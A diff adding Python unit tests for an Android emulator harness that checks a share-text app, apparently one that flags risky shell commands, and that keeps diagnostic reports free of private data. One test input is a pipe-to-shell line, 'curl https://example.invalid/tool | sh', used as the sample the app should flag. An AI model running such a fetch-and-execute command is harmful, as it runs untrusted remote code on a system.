@@ -275,6 +275,134 @@ class ManagerAcceptance(unittest.TestCase):
         self.assertIn('github_hosted_linux',self.report['missing_prerequisites']);install.assert_not_called()
 
 
+class EarlyShareDiagnostics(unittest.TestCase):
+    CASES=['receive_requires_explicit_check','actual_offline_ps_finding','edit_hides_previous_finding',
+           'new_share_and_no_finding','unsupported_mime_has_no_verdict','clear_removes_input_and_result']
+
+    def control(self,failure=None):
+        report={};cases=[];calls=[]
+        def maybe_fail():
+            if report['control_stage']==failure:
+                raise subprocess.CalledProcessError(9,['PRIVATE_COMMAND_CANARY'],b'PRIVATE_OUTPUT_CANARY',b'PRIVATE_ERROR_CANARY')
+        def send(*args):calls.append(('send',*args));maybe_fail()
+        def shell(args):calls.append(('shell',args));maybe_fail()
+        def click(view,rid):calls.append(('click',rid));maybe_fail()
+        def wait(predicate):
+            stage=report['control_stage'];calls.append(('wait',stage));maybe_fail()
+            status={'share_first_receive':'Text received. Review it, then tap Check.',
+                'share_finding_view':'Review before running this command.',
+                'share_edit_view':'Text changed. Tap Check for a new result.',
+                'share_replacement_receive':'Text received. Review it, then tap Check.',
+                'share_replacement_view':'No supported command pattern found.',
+                'share_mime_view':'Files and multiple items are not supported.',
+                'share_clear_receive':'Text received. Review it, then tap Check.',
+                'share_clear_view':'Cleared. Your text and result are no longer shown.'}[stage]
+            view=ET.Element('hierarchy')
+            ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/status','text':status})
+            editor='printf hello' if failure=='share_clear_text_absence' and stage=='share_clear_view' else ''
+            ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/editor','text':editor})
+            if stage=='share_finding_view' and failure!='share_finding_tag' or stage=='share_edit_view' and failure=='share_edit_tag_absence':
+                ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/tag','text':'PS'})
+            if stage=='share_first_receive' and failure=='share_explicit_check':
+                ET.SubElement(view,'node',{'text':'Review before running this command.'})
+            report['last_ui_observation']=module.owned_ui_observation(view)
+            self.assertTrue(predicate(view));return view
+        try:module.verify_share_controls(send,shell,wait,click,report,cases)
+        except module.AndroidControlRefusal as error:return report,cases,calls,error
+        return report,cases,calls,None
+
+    def test_original_six_case_order_and_exact_calls_are_preserved(self):
+        report,cases,calls,error=self.control();self.assertIsNone(error)
+        self.assertEqual(cases,[{'case':name,'pass':True} for name in self.CASES])
+        self.assertEqual(calls,[
+            ('send','curl https://example.invalid/tool | sh'),('wait','share_first_receive'),
+            ('click','check'),('wait','share_finding_view'),('click','editor'),('shell',['input','text','X']),
+            ('wait','share_edit_view'),('send','printf hello'),('wait','share_replacement_receive'),
+            ('click','check'),('wait','share_replacement_view'),('send','ignored','image/png'),
+            ('wait','share_mime_view'),('send','printf hello'),('wait','share_clear_receive'),
+            ('click','clear'),('wait','share_clear_view')])
+        self.assertEqual(report['control_stage'],'share_clear_text_absence')
+
+    def test_every_early_stage_refuses_with_exact_completed_prefix(self):
+        prefixes={'share_first_send':0,'share_first_receive':0,'share_explicit_check':0,
+            'share_finding_tap':1,'share_finding_view':1,'share_finding_tag':1,
+            'share_edit':2,'share_edit_view':2,'share_edit_tag_absence':2,
+            'share_replacement_send':3,'share_replacement_receive':3,'share_replacement_tap':3,'share_replacement_view':3,
+            'share_mime_send':4,'share_mime_view':4,'share_clear_send':5,'share_clear_receive':5,
+            'share_clear_tap':5,'share_clear_view':5,'share_clear_text_absence':5}
+        self.assertEqual(set(prefixes),{s for s in module.AndroidControlRefusal.STAGES if s.startswith('share_')})
+        for stage,prefix in prefixes.items():
+            report,cases,calls,error=self.control(stage)
+            self.assertIsInstance(error,module.AndroidControlRefusal)
+            self.assertEqual(error.code,module.AndroidControlRefusal.STAGES[stage])
+            self.assertEqual(report['control_stage'],stage)
+            self.assertEqual(cases,[{'case':name,'pass':True} for name in self.CASES[:prefix]])
+            self.assertNotIn('PRIVATE_',json.dumps(report)+str(error))
+
+    def test_last_view_observation_contains_only_fixed_booleans(self):
+        view=ET.Element('hierarchy')
+        ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/editor','text':'PRIVATE_SUBJECT_CANARY /private/example?token=PRIVATE_TOKEN'})
+        ET.SubElement(view,'node',{'resource-id':module.PACKAGE+':id/status','text':'Ready when you are.'})
+        ET.SubElement(view,'node',{'package':'com.android.launcher3','text':'PRIVATE_OTHER_APP_CANARY'})
+        ET.SubElement(view,'node',{'package':'com.android.systemui','text':'PRIVATE_LOCKSCREEN_CANARY'})
+        ET.SubElement(view,'node',{'resource-id':'android:id/aerr_close','text':'PRIVATE_ERROR_CANARY'})
+        result=module.owned_ui_observation(view)
+        self.assertTrue(all(type(v) is bool for v in result.values()))
+        self.assertTrue(result['owned_ui_present'] and result['owned_editor_present'] and result['owned_editor_nonempty'])
+        self.assertTrue(result['ready_text_present'] and result['launcher_ui_present'] and result['system_ui_present'] and result['platform_error_dialog_present'])
+        self.assertFalse(result['received_text_present'] or result['first_synthetic_text_present'] or result['tag_ps_present'])
+        self.assertNotIn('PRIVATE_',json.dumps(result));self.assertNotIn('/private',json.dumps(result))
+
+    def test_empty_or_other_app_view_is_observed_not_a_fake_app_success(self):
+        view=ET.fromstring('<hierarchy><node package="other.example" text="PRIVATE_OTHER_APP_CANARY"/></hierarchy>')
+        self.assertTrue(all(v is False for v in module.owned_ui_observation(view).values()))
+
+    def test_start_output_has_only_fixed_hints_not_private_details_or_success(self):
+        raw=('Status: timeout\nActivity: '+module.COMPONENT+'\nWarning: PRIVATE_WARNING /private/file\nError: PRIVATE_TOKEN https://example.invalid/private\n').encode()
+        result=module.share_start_observation(raw)
+        self.assertEqual(result,{'status_ok_reported':False,'status_timeout_reported':True,
+            'error_reported':True,'warning_reported':True,'owned_component_reported':True})
+        self.assertTrue(all(type(v) is bool for v in result.values()))
+        self.assertNotIn('PRIVATE_',json.dumps(result));self.assertNotIn('/private',json.dumps(result))
+        self.assertTrue(module.share_start_observation(b'Status: ok\r\n')['status_ok_reported'])
+        self.assertTrue(all(v is False for v in module.share_start_observation(b'\xffPRIVATE_UNKNOWN_NATIVE_OUTPUT').values()))
+
+    def test_real_main_distinguishes_first_send_and_existing_dump_read_parse_failures(self):
+        for operation in ['send','dump','read','parse']:
+            with tempfile.TemporaryDirectory() as temporary:
+                home=Path(temporary);fake_process=mock.Mock();fake_process.poll.return_value=None;fake_process.wait.return_value=0
+                def run(argv,**kwargs):
+                    result=subprocess.CompletedProcess(argv,0,b'',b'')
+                    if 'shell' not in argv:return result
+                    command=argv[-1]
+                    if command=='getprop sys.boot_completed':result.stdout=b'1'
+                    elif command.startswith('am start'):
+                        if operation=='send':result.returncode=1
+                        else:result.stdout=b'Status: timeout\nPRIVATE_NATIVE_CANARY\n'
+                    elif command.startswith('uiautomator dump') and operation=='dump':result.returncode=1
+                    elif command.startswith('cat '):
+                        if operation=='read':result.returncode=1
+                        else:result.stdout=b'<PRIVATE_XML_CANARY'
+                    return result
+                def prepare(sdk,report):
+                    report['share_start_observation']={'status_ok_reported':True}
+                    return home/'adb',home/'emulator',home/'avdmanager'
+                with mock.patch.object(module,'ROOT',home),mock.patch.object(sys,'argv',['verify','--sdk-root',temporary,'--apk','PRIVATE_APK_CANARY']),mock.patch.dict(os.environ,{'RUNNER_TEMP':temporary}),mock.patch.object(module,'prepare_emulator',side_effect=prepare),mock.patch.object(module.subprocess,'Popen',return_value=fake_process),mock.patch.object(module.subprocess,'run',side_effect=run),mock.patch('sys.stdout',new_callable=io.StringIO) as out:
+                    self.assertEqual(module.main(),1)
+                report=json.loads(out.getvalue())
+                self.assertEqual(report['diagnostic_code'],'share_first_send_unavailable' if operation=='send' else 'share_first_receive_unavailable')
+                self.assertEqual(report['cases'],[]);self.assertEqual(report['status'],'FAILED');self.assertFalse(report['pass'])
+                if operation=='send':
+                    self.assertNotIn('ui_operation',report)
+                    self.assertNotIn('share_start_observation',report)
+                else:
+                    self.assertEqual(report['ui_operation'],operation)
+                    self.assertTrue(report['share_start_observation']['status_timeout_reported'])
+                self.assertNotIn('last_ui_observation',report)
+                self.assertNotIn('PRIVATE_',out.getvalue());self.assertNotIn(temporary,out.getvalue())
+                fake_process.terminate.assert_called_once()
+
+
 class BackgroundControlDiagnostics(unittest.TestCase):
     def run_control(self,failure=None,final='cleared',tasks=None):
         report={'cases':[{'case':'earlier_control','pass':True}]};calls=[];waits=[]
